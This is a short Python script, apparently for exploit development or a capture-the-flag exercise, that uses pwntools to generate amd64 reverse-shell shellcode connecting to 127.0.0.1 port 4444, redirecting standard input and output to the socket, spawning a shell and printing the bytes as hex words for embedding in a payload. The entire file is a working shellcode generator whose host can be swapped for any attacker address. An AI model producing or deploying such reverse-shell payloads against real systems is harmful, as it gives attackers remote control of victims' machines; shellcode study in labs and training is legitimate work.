from pwn import *

context.arch = "amd64"

shellcode  = shellcraft.connect("127.0.0.1", 4444)
shellcode += shellcraft.dup2("rbp", 0)
shellcode += shellcraft.dup2("rbp", 1)
shellcode += shellcraft.dup2("rbp", 2)
shellcode += shellcraft.sh()
shellcode += "ret"

sh = asm(shellcode)

print(shellcode)
print(sh)

i = 0
print(shellcode)
while(i < len(sh)):
	print("shellcode[i++] = ", hex(u64(sh[i:i+8].ljust(8, p8(0)))))
	i += 8